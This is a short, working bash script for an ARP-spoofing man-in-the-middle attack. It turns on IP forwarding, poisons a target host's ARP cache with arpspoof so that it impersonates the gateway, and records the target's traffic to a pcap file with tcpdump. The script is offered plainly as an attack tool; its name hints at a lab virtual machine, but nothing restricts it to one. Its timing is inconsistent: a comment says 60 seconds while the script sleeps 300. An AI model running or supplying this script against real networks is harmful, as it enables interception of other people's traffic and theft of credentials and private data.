#!/bin/bash

# target_vm_arp_spoof.sh
TARGET_IP=$1
LOG_FILE="/home/rb/arp_attack_logs.txt"
GATEWAY_IP="172.30.112.1"  # Adjust to your network


# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    log_message "Please run as root"
    exit 1
fi

# Check if target IP is provided
if [ -z "$TARGET_IP" ]; then
    log_message "Usage: $0 <target_ip>"
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
log_message "Enabled IP forwarding"

# Start ARP spoofing (assuming arpspoof is installed)
log_message "Starting ARP spoofing attack against $TARGET_IP"
timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
SPOOF_PID=$!

# Start TCP dump to capture traffic
log_message "Starting traffic capture"
tcpdump -i eth0 -w /tmp/arp_capture.pcap &
TCPDUMP_PID=$!

# Run for 60 seconds
sleep 300

# Cleanup
kill $SPOOF_PID
kill $TCPDUMP_PID

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward
log_message "Disabled IP forwarding"

# Log the completion and capture file location
log_message "ARP spoofing attack completed. Captured traffic saved to /tmp/arp_capture.pcap"